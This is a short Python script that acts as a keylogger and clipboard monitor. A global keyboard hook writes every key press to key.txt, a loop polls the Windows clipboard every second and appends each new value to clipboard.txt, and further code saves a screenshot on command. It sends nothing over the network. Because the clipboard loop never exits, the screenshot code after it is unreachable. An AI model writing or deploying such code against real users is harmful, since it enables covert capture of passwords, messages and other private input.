import pyautogui
import time
import keyboard
import win32clipboard

def monitor_clipboard():
    history = []
    last_data = None

    while True:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
        except TypeError:
            data = None
        win32clipboard.CloseClipboard()

        if data != last_data:
            with open("clipboard.txt", "a") as file:
                file.write(f"\n{data}")
            history.append(data)
            last_data = data

        time.sleep(1)
        
def on_key_event(e):
    with open("key.txt", "a") as file:
        if e.name in ['shift', 'ctrl', 'alt', 'esc', 'enter', 'backspace']:
            file.write(f" {e.name}")
        else:
            file.write(f" {e.name}")

# Start listening to key events
keyboard.on_press(on_key_event)

monitor_clipboard()
x = input()
if x == "screen":
    screenshot = pyautogui.screenshot()

    # Save the screenshot
    screenshot.save("screenshot.png")